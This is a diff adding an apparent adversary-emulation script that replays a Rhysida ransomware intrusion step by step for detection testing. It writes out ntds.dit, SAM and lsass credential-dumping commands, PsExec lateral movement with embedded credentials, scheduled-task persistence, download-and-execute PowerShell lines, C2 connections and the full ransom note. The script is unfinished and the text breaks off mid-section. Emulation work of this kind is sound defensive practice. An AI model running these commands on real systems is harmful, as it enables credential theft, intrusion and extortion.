@@ -1,0 +1,1807 @@
+title "Rhysida Ransomware Attack Behavior and Indicators"
+author "Detecteam"
+description "Threat actors leveraging Rhysida ransomware are known to impact “targets of opportunity,” including victims in the education, healthcare, manufacturing, information technology, and government sectors. Open source reporting details similarities between Vice Society (DEV-0832) activity and the actors observed deploying Rhysida ransomware. Additionally, open source reporting has confirmed observed instances of Rhysida actors operating in a ransomware-as-a-service (RaaS) capacity, where ransomware tools and infrastructure are leased out in a profit-sharing model. Any ransoms paid are then split between the group and the affiliates."
+revision 1
+reference "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a"
+reference "https://www.fortinet.com/content/dam/fortinet/assets/threat-reports/rhysida-ransomware-intrusion.pdf"
+status "development"
+
+######################
+#  MACHINE INVOLVED IN THIS ATTACK
+#  SONICWALL_VPN            = VPN
+#  HOST_DC2 / HOST_DC4      = DOMAIN_CONTROLLER
+#  HOST_A / HOST_D / HOST_E / HOST_F = HOST
+#  HOST_FILESERVER1         = FILE SERVER
+######################
+
+#tag "detecteam:ransomware"
+#tag "detecteam:platform=windows"
+#tag "detecteam:impact=Data exfiltration and Data encryption using Rhysida Ransomware on compromised endpoints"
+#tag "threat-group=DEV-0832"
+
+
+tag "mitre-attack=T1012"
+tag "mitre-attack=T1069.001"
+tag "mitre-attack=T1069.002"
+tag "mitre-attack=T1083"
+tag "mitre-attack=T1087.002"
+tag "mitre-attack=T1518"
+
+
+
+$user = user.generate()
+$user.name = $user["username"]
+$ransom.note = """
+
+Security Notice from Cyber Pentesting Team
+
+Attention Management:
+The scheduled penetration testing of your network has been successfully completed. Please contact us immediately at the following email addresses to review the findings, discuss next steps, and initiate the process of returning your network to its operational state. This is an essential step to ensure the security and integrity of your network infrastructure. Your prompt response is required to expedite this process. This could inflict significant reputational and financial damage.
+Email Addresses:
+NatashiaStrosin@onionmail.org KentAdams@onionmail.org
+
+For more information, please visit our website:
+rhysidafohrhyy2aszi7bm32tnjat5xri65fopcxkdfxhi4tidsg7cad.onion rhysidafc6lm7qa2mkiukbezh7zuth3i4wof4mh2audkymscjm6yegad.onion with your secret key ZQ838UWHBHFNFYHN98SOMPGHUKL9DH8P
+
+Attention Employees:
+This logon notification is to inform you that the recent network disruptions were part of a planned security test by our IT department in collaboration with pentesting company "Rhys1da". We appreciate your understanding and patience during this crucial testing phase. With approval from management pending, you may find that some business processes are not yet restored. In the meantime, feel free to enjoy a relaxed moment with a cup of coffee and some leisure time on Instagram or Facebook.
+
+Thank you,
+Your Cybersecurity Pentesting Company "Rhys1da"
+"""
+
+$vpn_server_ip = "10.0.0.231"
+$domain_controller_ip = "10.0.0.1"
+$domain = "paradise_bay"
+$domain_username = "domain_user"
+$domain_password = "P@ssw0rd123"
+$file_server = "FILESERVER_1"
+$file_server_ip = "10.0.0.200"
+$user.name = "john_doe"
+$vpn_username = "john_doe"
+$vpn_password = "P@ssw0rd123"
+$host_a_ip = "10.0.0.10"
+$host_d_ip = "10.0.0.12"
+$host_e_ip = "10.0.0.15"
+$host_f_ip = "10.0.0.17"
+$host_dc4_ip = "10.0.0.20"
+$esxi_server_1_ip = "10.0.0.40"
+$esxi_server_2_ip = "10.0.0.50"
+
+# 1. Rhysida operators acquire credentials and access environments through 
+# victim VPN devices.
+
+section start "Start" {}
+
+# SonicWall VPN access with valid credentials
+# Test login and logout to server in short time period
+section pre_compromise_test_access "Pre-compromise: Short access to VPN" {
+    step initiate_vpn_connection {
+        $network.protocol = "VPN"
+        $network.direction = "outbound"
+        $destination.ip = $vpn_server_ip
+        $destination.port = "1194"  # Example port for OpenVPN
+        $user.credentials.username = $vpn_username
+        $user.credentials.password = $vpn_password
+        run VPNConnect
+    }
+    sleep 10
+
+    # Valid short connection via VPN Connection
+
+    phase "Initial Access"
+    step valid_credentials_vpn_connection {
+        action User.LoginSuccess
+    }
+    sleep 5
+
+    step vpn_disconnect_after_short_time {
+        action User.Logout
+    }
+}
+
+# Adversory dumps Active Directory database via RDP connection
+# Advanced IP Scanner used to map network and initial credential dump performed
+
+# login to VPN appliance (SonicWall) using valid user account
+# RDP to domain controller. No discovery, likely to validate credential.
+
+
+# During this RDP session, the threat actor accessed the server and opened the Active Directory
+# Administrative Center, likely to view the various domain configuration settings
+section access_active_directory_administrative_center "Access Active Directory Administrative Center" {
+    step launch_ad_admin_center {
+        $process.command_line = "C:\Windows\System32\dsa.msc"
+        action Process.Start
+    }
+}
+
+#  No further activity followed this session until two days later.
+sleep time.days(2)
+
+
+section ransomware_operator_initial_access "Day 1: Ransomware operator initial access" {}
+
+section vpn_connection "VPN Connection" {
+    step initiate_vpn_connection {
+        $network.protocol = "VPN"
+        $network.direction = "outbound"
+        $destination.ip = $vpn_server_ip
+        $destination.port = "1194"
+        $user.credentials.username = $vpn_username
+        $user.credentials.password = $vpn_password
+        run VPNConnect
+    }
+    sleep 5
+
+    step valid_credentials_vpn_connection {
+        action User.LoginSuccess
+    }
+    sleep 5
+}
+
+# 2. Lateral movement through Remote Desktop Protocol (RDP) to key servers 
+# (i.e. domain controllers
+# The first RDP session to the server HOST_A using the compromised user's account was observed in early was observed
+# in early July 2023.
+
+section rdp_connection "RDP Connection to Domain Controller" {
+    step initiate_rdp_connection {
+        $network.protocol = "RDP"
+        $network.direction = "outbound"
+        $destination.ip = $domain_controller_ip
+        $destination.port = "3389"  # Default RDP port
+        $user.credentials.username = $domain_username
+        $user.credentials.password = $domain_password
+        $source.ip = $vpn_server_ip
+        run RDPConnect
+    }
+    sleep 5
+
+    step rdp_connection_success {
+        action RDP.ConnectSuccess
+    }
+    sleep 5
+}
+
+
+# 3. Credential dumping using basic methods (i.e., taskmanager.exe, procdump)
+
+# Page 6 - FROM DOMAIN CONTROLLER SERVER WITH ACTIVE DIRECTORY
+section copy_active_directory_database "Copy Active Directory Database" {
+    # Step 1: Stop Active Directory Services
+    $stop_services = [
+        "NTDS", 
+        "Netlogon", 
+        "KDC"
+    ]
+    loop $stop_services as $stop_service {
+        step stop_ad_services {
+            $process.command_line = "net stop ${stop_service}"
+            action Process.Start
+        }
+    }
+    sleep 5  # Waiting for services to stop
+
+    # Step 2: Make a Copy of the NTDS.dit File
+    step copy_ntds_dit {
+        $file_path = "%SystemRoot%\NTDS\ntds.dit"
+        $destination_path = "C:\Windows\Temp\ntds_copy.dit"
+        $process.command_line = "cmd.exe /c copy ${file_path} ${destination_path}"
+        action Process.Start
+    }
+    sleep 3  # Waiting for file copy to complete
+
+    # Step 3: Start Active Directory Services
+    $start_services = [
+        "NTDS", 
+        "Netlogon", 
+        "KDC"
+    ]
+    loop $start_services as $start_service {
+        step start_ad_services {
+            $process.command_line = "net start ${start_service}"
+            action Process.Start
+        }
+    }
+    sleep 5  # Waiting for services to start
+}
+
+# Page 6 - from HOST_A
+section advanced_ip_scanner "Advanced IP Scanner" {
+    step download_advanced_ip_scanner {
+        $destination.port = 443
+        $destination.domain = "download.advanced-port-scanner.com"
+        $destination.ip = ip.gethostbyname($destination.domain)
+        $url.path = "/download/files/Advanced_Port_Scanner_2.5.3869.exe"
+        run HTTPConnection
+    }
+    
+    $advanced_port_scanner_files = ["advanced_port_scanner_ar_sa.qm","advanced_port_scanner_bg_bg.qm","advanced_port_scanner_console.exe","advanced_port_scanner_cs_cz.qm","advanced_port_scanner_da_dk.qm","advanced_port_scanner_de_de.qm","advanced_port_scanner_el_gr.qm","advanced_port_scanner_en_us.qm","advanced_port_scanner_es_es.qm","advanced_port_scanner_et_ee.qm","advanced_port_scanner.exe","advanced_port_scanner_fa_ir.qm","advanced_port_scanner_fi_fi.qm","advanced_port_scanner_fr_fr.qm","advanced_port_scanner_he_il.qm","advanced_port_scanner_hr_hr.qm","advanced_port_scanner_hu_hu.qm","advanced_port_scanner_id_id.qm","advanced_port_scanner_it_it.qm","advanced_port_scanner_ja_jp.qm","advanced_port_scanner_ko_kr.qm","advanced_port_scanner_lt_lt.qm","advanced_port_scanner_lv_lv.qm","advanced_port_scanner_nb_no.qm","advanced_port_scanner_nl_nl.qm","advanced_port_scanner_pl_pl.qm","advanced_port_scanner_pt_br.qm","advanced_port_scanner_ro_ro.qm","advanced_port_scanner_ru_ru.qm","advanced_port_scanner_sk_sk.qm","advanced_port_scanner_sl_si.qm","advanced_port_scanner_sr_latn_rs.qm","advanced_port_scanner_sv_se.qm","advanced_port_scanner_th_th.qm","advanced_port_scanner_tr_tr.qm","advanced_port_scanner_uk_ua.qm","advanced_port_scanner_vi_vn.qm","advanced_port_scanner_zh_cn.qm","advanced_port_scanner_zh_tw.qm","details_panel_ar_sa.tpl","details_panel_bg_bg.tpl","details_panel_cs_cz.tpl","details_panel_da_dk.tpl","details_panel_de_de.tpl","details_panel_el_gr.tpl","details_panel_en_us.tpl","details_panel_es_es.tpl","details_panel_et_ee.tpl","details_panel_fa_ir.tpl","details_panel_fi_fi.tpl","details_panel_fr_fr.tpl","details_panel_he_il.tpl","details_panel_hr_hr.tpl","details_panel_hu_hu.tpl","details_panel_id_id.tpl","details_panel_it_it.tpl","details_panel_ja_jp.tpl","details_panel_ko_kr.tpl","details_panel_lt_lt.tpl","details_panel_lv_lv.tpl","details_panel_nb_no.tpl","details_panel_nl_nl.tpl","details_panel_pl_pl.tpl","details_panel_pt_br.tpl","details_panel_ro_ro.tpl","details_panel_ru_ru.tpl","details_panel_sk_sk.tpl","details_panel_sl_si.tpl","details_panel_sr_latn_rs.tpl","details_panel_sv_se.tpl","details_panel_th_th.tpl","details_panel_tr_tr.tpl","details_panel_uk_ua.tpl","details_panel_vi_vn.tpl","details_panel_zh_cn.tpl","details_panel_zh_tw.tpl","libeay32.dll","mac_interval_tree.txt","msvcp120.dll","msvcr120.dll","pcre.dll","platforms","printsupport","Qt5Core.dll","Qt5Gui.dll","Qt5Network.dll","Qt5PrintSupport.dll","Qt5Widgets.dll","Qt5WinExtras.dll","Qt5Xml.dll","rserv35ml.msi","rview35ml.msi","service_probes","ssleay32.dll","platforms/qwindows.dll","printsupport/windowsprintersupport.dll"]
+    $advanced_port_scanner_install_dir = "C:\\Program Files (x86)\\Advanced Port Scanner"
+    loop $advanced_port_scanner_files as $installed_file {
+        step install_advanced_ip_scanner {
+            $file.name = "${advanced_port_scanner_install_dir}\\${installed_file}"
+            run File.Create
+        }
+    }
+
+    # a registry entry was created with a range of IP addresses that were 
+    # scanned for reconnaissance
+    $network_address_to_scan = [ 
+        "207.38.72.0/24",
+        "10.10.0.0/16",
+        "10.30.0.0/16",
+        "10.143.0.0/16",
+        "192.168.0.0/16"
+    ]
+    loop $network_address_to_scan as $network {
+        step start_advanced_ip_scanner {
+            $aps = "${advanced_port_scanner_install_dir}\\advanced_port_scanner_console.exe"
+            $process.command_line = "${aps} ${network}"
+            action Process.Start
+        }
+        sleep 1 
+        loop 254 as $index {
+            $ip.origin = $host_a_ip
+            $ip.destination = ip.cidr($network, $index)
+            loop 1024 as $destination.port {
+                step tcp_connection {
+                    run TCPSynDrop
+                }
+            }
+        }
+    }
+}
+ 
+section launch_discovery_command "Launch Discovery Commands" {    
+    $discovery_commands = [
+        """net user ${user.name} /domain""",
+        """net group "domain computers" /domain""",
+        """net group "domain admins" /domain""",
+        """net localgroup administrators"""
+    ]
+    loop $discovery_commands as $process.command_line {
+        $process.parent.command_line = "Powershell.exe"
+        step run_discovery_command {
+            action Process.Start
+        }
+    }
+}
+
+# After port scanning was completed from HOST_A, the threat actor established
+# a separate RDP connection to HOST_FILESERVER1 and tried to dump credentials 
+# using Windows Task Manager (Taskmgr.exe). After that, the threat actor
+# attempted to perform a credential dump using SAM access. The threat actor 
+# then tried to execute the Microsoft SysInternals tool ‘procdump.exe’. All
+# three of these events generated FortiEDR alerts. They are discussed in 
+# detail in the ‘Initial Detection' section of this report, above.
+
+# FROM HOST_A -> HOST_FILESERVER1
+
+section rdp_connection_to_file_server "RDP Connection to File Server" {
+    step initiate_rdp_connection {
+        $network.protocol = "RDP"
+        $network.direction = "outbound"
+        $destination.ip = $file_server_ip
+        $destination.port = "3389"  # Default RDP port
+        $user.credentials.username = $domain_username
+        $user.credentials.password = $domain_password
+        $source.ip = $vpn_server_ip
+        run RDPConnect
+    }
+    sleep 5
+
+    step rdp_connection_success {
+        action RDP.ConnectSuccess
+    }
+    sleep 5
+}
+
+section dump_credentials_via_taskmanager "OS Credentials Dumping: Task Manager" {
+    step start_taskmanager {
+        $command = "Taskmgr.exe"
+        $process.command_line = $command
+        action Process.Start
+    }
+    sleep 5
+    
+    step create_dump_file {
+        # NEED TO PUT THE RIGHT FUNCTION TO RETRIEVE VALUES
+        # $date = "240301"
+        # $time = "153000" 
+        $file.path = "C:\Users\${user.name}\Downloads\lsass.exe_240301_153000.dmp"
+        action File.Create
+    }
+    sleep 5
+}
+
+tag "mitre-attack=T1003.002" # OS Credential Dumping: Security Account Manager
+section os_credential_dumping_sam "OS Credential Dumping: Security Account Manager" {
+    step dump_sam_database {
+        $sam_file_path = "C:\Windows\System32\config\SAM"
+        $dumped_sam_file_path = "C:\Temp\SAM_dump"
+        $process.command_line = "cmd.exe /c copy ${sam_file_path} ${dumped_sam_file_path}"
+        action Process.Start
+    }
+    sleep 5
+
+    step copy_sam_database_file {
+        $source_file_path = "C:\Windows\System32\config\SAM"
+        $destination_folder_path = "C:\Temp"
+        $process.command_line = "cmd.exe /c copy ${source_file_path} ${destination_folder_path}"
+        action Process.Start
+    }
+    sleep 5
+}   
+
+section os_credential_via_procdump "OS Credential Dumping: ProcDump" {
+    step download_procdump {
+        $destination.port = 443
+        $destination.domain = "download.sysinternals.com"
+        $destination.ip = ip.gethostbyname($destination.domain)
+        $url.path = "/files/Procdump.zip"
+        run HTTPConnection
+    }
+    sleep 5
+    
+    $file.path = "C:\Users\${user.name}\Downloads\Procdump.zip"
+    step file_create {
+        action File.Create
+    }
+    sleep 2
+    
+    step unzip_procdump {
+        $process.command_line = "unzip ${file.path}"
+        action Process.Start
+    }
+    sleep 2
+    
+    $procdump_files = [
+        "eula.txt",
+        "procdump.exe",
+        "procdump64.exe",
+        "procdump64a.exe"
+    ]
+    loop $procdump_files as $file_name {
+        step create_unzip_files {
+            $file.path = "C:\Temp\${file_name}"
+            action File.Create
+        } 
+        sleep 1
+    }
+
+    $dump_filename = "lsass.dmp"
+    step start_procdump {
+        $process.command_line = "C:\Temp\procdump.exe -accepteula -ma lsass.exe ${dump_filename}"
+        action Process.Start
+    }
+    sleep 2
+    
+    step create_dump_file {
+        $file.path = "C:\Temp\${dump_filename}"
+        action File.Create
+    }
+}
+
+tag "mitre-attack=T1003.001" # OS Credential Dumping: LSASS Memory
+section more_credentials_access_attempts {
+    step download_inpmem_mini_x64_rc2_exe {
+        $destination.path = """C:\Users\${user.name}\Downloads\volatility3_portable\ """
+        $file = "inpmem_mini_x64_rc2.exe"
+        $file.name = $file
+        action File.Create
+    }
+    sleep random.float(0.2, 1.5)
+    
+    step download_vol_exe {
+        $destination.path = """C:\Users\${user.name}\Downloads\volatility3_portable\ """
+        $file.name = "vol.exe"
+        action File.Create
+    }
+    sleep random.float(0.2, 1.5)
+    
+    step download_inpmem_mini_x64_rc2_exe {
+        $process.command_line = """C:\Users\${user.name}\Downloads\volatility3_portable\ """
+        action Process.Start
+    }
+    sleep random.float(0.2, 1.5)
+    
+    sleep 300
+    
+    step start_vol_exe {
+        $command = "vol.exe -f mem.dmp windows.hashdump.Hashdump"
+        $process.command_line = $command
+        action Process.Start
+    }
+    sleep random.float(0.2, 1.5)
+    
+    step start_vol_exe {
+        $file.name = "mem.dmp"
+        action File.Create
+    }
+    sleep random.float(0.2, 1.5)
+}
+
+# Page 7 -
+# After these failed credential dumping attempts, the threat actor created another RDP session to HOST_FILESERVER1 from HOST_A
+# using their existing compromised local administrator account. From this RDP session on HOST_FILESERVER1, the threat actor
+# continued their internal discovery with port scanning
+
+section rdp_connection_to_file_server "RDP Connection to File Server" {
+    step initiate_rdp_connection {
+        $network.protocol = "RDP"
+        $network.direction = "outbound"
+        $source.ip = $host_a_ip
+        $destination.ip = $file_server_ip
+        $destination.port = "3389"  # Default RDP port
+        $user.credentials.username = $domain_username
+        $user.credentials.password = $domain_password
+        $source.ip = $vpn_server_ip
+        run RDPConnect
+    }
+    sleep 5
+
+    step rdp_connection_success {
+        action RDP.ConnectSuccess
+    }
+    sleep 5
+}
+
+
+# Page 7 - from HOST_FILESERVER1
+section advanced_ip_scanner "Advanced IP Scanner" {
+    step download_advanced_ip_scanner {
+        $destination.port = 443
+        $destination.domain = "download.advanced-port-scanner.com"
+        $destination.ip = ip.gethostbyname($destination.domain)
+        $url.path = "/download/files/Advanced_Port_Scanner_2.5.3869.exe"
+        run HTTPConnection
+    }
+    
+    $advanced_port_scanner_files = ["advanced_port_scanner_ar_sa.qm","advanced_port_scanner_bg_bg.qm","advanced_port_scanner_console.exe","advanced_port_scanner_cs_cz.qm","advanced_port_scanner_da_dk.qm","advanced_port_scanner_de_de.qm","advanced_port_scanner_el_gr.qm","advanced_port_scanner_en_us.qm","advanced_port_scanner_es_es.qm","advanced_port_scanner_et_ee.qm","advanced_port_scanner.exe","advanced_port_scanner_fa_ir.qm","advanced_port_scanner_fi_fi.qm","advanced_port_scanner_fr_fr.qm","advanced_port_scanner_he_il.qm","advanced_port_scanner_hr_hr.qm","advanced_port_scanner_hu_hu.qm","advanced_port_scanner_id_id.qm","advanced_port_scanner_it_it.qm","advanced_port_scanner_ja_jp.qm","advanced_port_scanner_ko_kr.qm","advanced_port_scanner_lt_lt.qm","advanced_port_scanner_lv_lv.qm","advanced_port_scanner_nb_no.qm","advanced_port_scanner_nl_nl.qm","advanced_port_scanner_pl_pl.qm","advanced_port_scanner_pt_br.qm","advanced_port_scanner_ro_ro.qm","advanced_port_scanner_ru_ru.qm","advanced_port_scanner_sk_sk.qm","advanced_port_scanner_sl_si.qm","advanced_port_scanner_sr_latn_rs.qm","advanced_port_scanner_sv_se.qm","advanced_port_scanner_th_th.qm","advanced_port_scanner_tr_tr.qm","advanced_port_scanner_uk_ua.qm","advanced_port_scanner_vi_vn.qm","advanced_port_scanner_zh_cn.qm","advanced_port_scanner_zh_tw.qm","details_panel_ar_sa.tpl","details_panel_bg_bg.tpl","details_panel_cs_cz.tpl","details_panel_da_dk.tpl","details_panel_de_de.tpl","details_panel_el_gr.tpl","details_panel_en_us.tpl","details_panel_es_es.tpl","details_panel_et_ee.tpl","details_panel_fa_ir.tpl","details_panel_fi_fi.tpl","details_panel_fr_fr.tpl","details_panel_he_il.tpl","details_panel_hr_hr.tpl","details_panel_hu_hu.tpl","details_panel_id_id.tpl","details_panel_it_it.tpl","details_panel_ja_jp.tpl","details_panel_ko_kr.tpl","details_panel_lt_lt.tpl","details_panel_lv_lv.tpl","details_panel_nb_no.tpl","details_panel_nl_nl.tpl","details_panel_pl_pl.tpl","details_panel_pt_br.tpl","details_panel_ro_ro.tpl","details_panel_ru_ru.tpl","details_panel_sk_sk.tpl","details_panel_sl_si.tpl","details_panel_sr_latn_rs.tpl","details_panel_sv_se.tpl","details_panel_th_th.tpl","details_panel_tr_tr.tpl","details_panel_uk_ua.tpl","details_panel_vi_vn.tpl","details_panel_zh_cn.tpl","details_panel_zh_tw.tpl","libeay32.dll","mac_interval_tree.txt","msvcp120.dll","msvcr120.dll","pcre.dll","platforms","printsupport","Qt5Core.dll","Qt5Gui.dll","Qt5Network.dll","Qt5PrintSupport.dll","Qt5Widgets.dll","Qt5WinExtras.dll","Qt5Xml.dll","rserv35ml.msi","rview35ml.msi","service_probes","ssleay32.dll","platforms/qwindows.dll","printsupport/windowsprintersupport.dll"]
+    $advanced_port_scanner_install_dir = "C:\\Program Files (x86)\\Advanced Port Scanner"
+    loop $advanced_port_scanner_files as $installed_file {
+        step install_advanced_ip_scanner {
+            $file.name = "${advanced_port_scanner_install_dir}\\${installed_file}"
+            run File.Create
+        }
+    }
+
+    # a registry entry was created with a range of IP addresses that were 
+    # scanned for reconnaissance
+    $network_address_to_scan = [ 
+        "207.38.72.0/24",
+        "10.10.0.0/16",
+        "10.30.0.0/16",
+        "10.143.0.0/16",
+        "192.168.0.0/16"
+    ]
+    loop $network_address_to_scan as $network {
+        step start_advanced_ip_scanner {
+            $aps = "${advanced_port_scanner_install_dir}\\advanced_port_scanner_console.exe"
+            $process.command_line = "${aps} ${network}"
+            action Process.Start
+        }
+        sleep 1 
+        loop 254 as $index {
+            $origin.ip = $host_a_ip
+            $destination.ip = ip.cidr($network, $index)
+            loop 1024 as $destination.port {
+                step tcp_connection {
+                    run TCPSynDrop
+                }
+            }
+        }
+    }
+}
+
+# After this discovery activity, the threat actor attempted to execute several
+# PowerShell scripts through PowerShell ISE. Windows PowerShell Integrated 
+# Scripting Environment (ISE) is a graphical host application that enables users 
+# to run, debug, and test scripts in a graphic-assisted environment.
+section run_powershell_integrated_scripting_environment "Run PS ISE" {
+    step run_psise {
+        $process.command_line = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise"
+        action Process.Start 
+    }
+    sleep 1
+    
+    # PowerShell ISE processes' behavior indicated that the code attempted to 
+    # connect to the IP address 5.255.113[.]37
+    step connection_to_ip_from_psise {
+        $origin.ip = $host_a_ip
+        $destination.ip = "5.255.113.37"
+        run HTTPConnection
+    }
+    sleep 10
+}
+
+# Shortly after the blocked PowerShell ISE activity was observed on HOST_A,
+# additional identical PowerShell ISE activity was observed for RDP sessions 
+# on HOST_DC2, HOST_DC4, HOST_E, and HOST_FILESERVER1. 
+# The HOST_DC2 and HOST_DC4 are the domain controller servers,
+# whereas HOST_FILESERVER1 is a fileserver in the client network. Following these 
+# blocked attempts, the threat actor altered their TTPs and attempted to execute their
+# PowerShell commands using a different method.
+
+# The threat actor's other method was the utility ‘PsExec.exe,’ a Microsoft SysInternals tool often used by system administrators to
+# execute applications on remote systems and with elevated privileges. The process chain started with PowerShell being executed
+# with the following parameters from an interactive RDP logon session:
+
+section using_psexec "Method using PsExec" {
+    step initiate_rdp_connection {
+        $network.protocol = "RDP"
+        $network.direction = "outbound"
+        $source.ip = $host_a_ip
+        $destination.ip = $file_server_ip
+        $destination.port = "3389"  # Default RDP port
+        $user.credentials.username = $domain_username
+        $user.credentials.password = $domain_password
+        run RDPConnect
+    }
+    sleep 5
+
+    step rdp_connection_success {
+        action RDP.ConnectSuccess
+    }
+    sleep 60
+
+    # this created an interactive PowerShell shell with ‘C:\Users\Public’ as the working directory.
+    step execute_powershell {
+        $process.command_line = "powershell.exe -noexit -command “set-location ‘C:\Users\Public’” "
+        action Process.Start
+    }
+    sleep 1
+    
+    # Try to obtain the system privileges
+    step start_psexec {
+        $process.command_line = "PsExec.exe -i -s powershell.exe"
+        action Process.Start
+    }
+    sleep 1
+    
+    # Once the threat actor had a PowerShell shell with system privileges, they 
+    # attempted to execute a PowerShell script, ‘ad.ps1’ with the following 
+    # command parameters
+    step execute_ad_ps1 {
+        $process.command_line = "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File .\ad.ps1"
+        action Process.Start
+    }
+    sleep 5
+    
+}
+
+# the threat actor tried a different technique of using a malicious DLL file 
+# main.dll on the victim hosts. On the device HOST_FILESERVER1, the execution of
+# a DLL file main.dll was performed through the proxy execution of the Windows
+# utility ‘rundll32.exe’. On execution, the main.dll library spawns a PowerShell 
+# subprocess to perform an IP lookup on itself to determine the endpoint’s 
+# external IP address. FortiEDR blocked the network connection established as 
+# part of this behavior. The following command line arguments were used to 
+# perform this lookup through PowerShell:'# 
+
+section execute_main_dll "Execute main.dll" {
+    step execute_main_dll {
+        $dll_path = "C:\Users\Public\main.dll"
+       $process.command_line = "C:\Windows\System32\rundll32.exe ${dll_path}"
+        action Process.Start
+    }
+    sleep 3
+    
+    step nslookup {
+        $process.command_line = "nslookup.exe -command '& nslookup myip.opendns.com resolver1.opendns.com' "
+        action Process.Start
+    }
+    sleep 10
+    
+    # Page 9 -
+    
+    # The actor tried to create the persistent execution of the main.dll file using
+    # an ‘iii.bat’ (batch script), which was created and added to the system scheduler 
+    # as an ONSTART scheduled task. ONSTART specifies that a task runs every time 
+    # the system starts.
+
+    
+    $schtask_commands = [
+        "schtasks /delete /tn System",
+        "schtasks /create /sc ONSTART /tn System /tr 'rundll32 C:\Users Public\main.dll Test' /ru system ",
+        "schtasks /run /tn System"
+    ]
+    loop $schtask_commands as $command {
+        step create_schtasks {
+            $process.command_line = $command
+            action Process.Start
+        }
+        sleep 1
+    }
+}
+
+# Following the establishment of persistence through the main.dll file, the batch
+# script executes the scheduled task. As part of its execution, the main.dll 
+# library attempts to connect to its C2 public IP address, 23.108.57[.]83, 
+# on port 443. On the victim machine HOST_FILESERVER1, this main.dll was in 
+# folder “C:\Users\Public.”
+        
+section connection_to_C2 "Connection to C2" {
+
+    step execute_main_dll_test {
+        $dll_path = "C:\Users\Public\main.dll"
+        $process.command_line = "C:\Windows\System32\rundll32.exe ${dll_path} Test"
+        action Process.Start
+    }
+    sleep 10
+    
+    step main_dll_connection {
+        $destination.port = 443
+        $origin.ip = $file_server_ip
+        $destination.ip = "23.108.57.83" # Malware CnC and Bumblebee C2
+        run HTTPConnection
+    }
+    sleep 10
+}
+
+# For the next stage of the intrusion, the threat actor created PowerShell 
+# script ‘w.ps1’ on the domain controller server HOST_D. This script was stored 
+# in this server's shared folder, ‘s$’. The threat actor began to deploy this 
+# ‘w.ps1’ PowerShell script to multiple hosts in the network using the PSEXEC 
+# utility. The FortiGuard IR team found evidence of this script being executed 
+# on at least 16 hosts.
+
+tag "mitre-attack = T1217" # Browser Information Discovery
+section create_and_deploy_w_ps1 {
+    step create_powershell_script {
+        # This script was stored in the HOST_D shared folder, ‘s$’.
+        $file.name = "s$\w.ps1"
+        action File.Create
+    }
+    sleep 1
+    
+    $ip_hosts = [
+        $file_server_ip,
+        $host_a_ip,
+        $host_e_ip,
+        $host_f_ip,
+        $host_dc4_ip,
+        $domain_controller_ip
+    ]
+    loop $ip_hosts as $ip {
+        step deploy_with_psexec {
+            $psexec_command = "psexec.exe \\\\${ip} -u ${domain}\\${domain_username} -p ${domain_password} -c -f -s powershell.exe -executionpolicy bypass -file s$\w.ps1"
+            action Process.Start
+        }
+        sleep 2
+    }
+}
+
+# Adversories identify fileshare and opens a number of files, likely to validate prior to exfil.
+# Accessed via RGP Gui.
+section data_validation_and_initial_exfiltration "Day 3: Data validation and initial exfiltration" {}
+
+section identify_and_list_fileshare "Identify File Share of File Server" {
+    # Step 1: Enumerate Shares
+    step enumerate_shares {
+        $command = "net share"
+        $process.command_line = $command
+        action Process.Start
+    }
+    sleep 5  # Waiting for enumeration to complete
+
+    $share_names = [
+        "C$",
+        "ADMIN$",
+        "IPC$",
+        "Files",
+        "Backups"
+    ]
+
+    # Step 1: Connect to Each Share
+    loop $share_names as $share_name {
+        step connect_to_share {
+            $command = "net use \\\\${file_server}\\${share_name} /user:${domain_username} ${domain_password}"
+            $process.command_line = $command
+            action Process.Start
+        }
+        sleep 3
+        
+        # Step 2: List Files in the Share
+        step list_files {
+            $command = "dir \\\\${file_server}\\${share_name}"
+            $process.command_line = $command
+            action Process.Start
+        }
+        sleep 3
+        
+        # Step 3: Disconnect from the Share
+        step disconnect_from_share {
+            $command = "net use \\\\${file_server}\\${share_name} /delete"
+            $process.command_line = $command
+            action Process.Start
+        }
+        sleep 3
+    }
+}
+
+
+
+
+# Adversory deploys a number of Powershell scripts to establish persistence mechanisms
+# through Cobalt Strike and bespoke loopback forwarding to proxy received C2 traffic
+section establish_persistence "Day 3: Establish Persistence" {
+
+    # Step 1: Deploy PowerShell Script for Cobalt Strike Beacon
+    step deploy_cobalt_strike_beacon {
+        $command = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://cobaltstrike.com/download')"
+        $process.command_line = $command
+        action Process.Start
+    }
+    
+    sleep 5
+
+    # Step 2: Deploy PowerShell Script for Loopback Forwarding
+    step deploy_loopback_forwarding {
+        $command = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.com/loopback_forwarding_script.ps1')"
+        $process.command_line = $command
+        action Process.Start
+    }
+
+    $commands = [
+        "Get-Process | Where-Object {$_.Name -eq 'cobaltstrike.exe'}",
+        "Get-Process | Where-Object {$_.Name -eq 'loopback_forwarding.exe'}"
+    ]
+    # Step 3: Verify Persistence
+    loop $commands as $command {
+        step verify_persistence {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    sleep time.hours(6)
+}
+
+
+# Approximately six hours after the abovementioned activity, the threat actor 
+# continued their operations. The threat actor authenticated through RDP to the
+# HOST_DC4 endpoint and created an executable called ‘DataGrabberl.exe’ in the
+# directory ‘C:\Users\<Compromised User Account>\Downloads\Boby\.’
+# This DataGrabberI.exe was renamed C:\Users\<Compromised User
+# Account>\Pictures\Saved Pictures\dob.exe.
+
+
+section datagrabber_part "Datagrabber part" {
+    step initiate_rdp_connection {
+        $network.protocol = "RDP"
+        $network.direction = "outbound"
+        $source.ip = $host_a_ip
+        $destination.ip = $host_dc4_ip
+        $destination.port = "3389"  # Default RDP port
+        $user.credentials.username = $domain_username
+        $user.credentials.password = $domain_password
+        run RDPConnect
+    }
+    sleep 5
+
+    step rdp_connection_success {
+        action RDP.ConnectSuccess
+    }
+    sleep 60
+
+    step create_datagrabberl_exe {
+        $file.path = "C:\Users\$user.credentials.username\Downloads\Boby\.\DataGrabberl.exe"
+        action File.Create
+    }
+    sleep 10
+
+    step rename_datagrabberl {
+        # how to do a file rename ???
+        $file_path = "C:\Users\$user.credentials.username\Downloads\Boby\.\dob.exe"
+        action File.Create
+    }
+    sleep 10
+    
+}
+
+
+section download_and_execute_anydesk "Download and Execute AnyDesk" {
+    step download_anydesk {
+        $destination.port = 443
+        $destination.domain = "download.anydesk.com"
+        $origin.ip = $host_f_ip
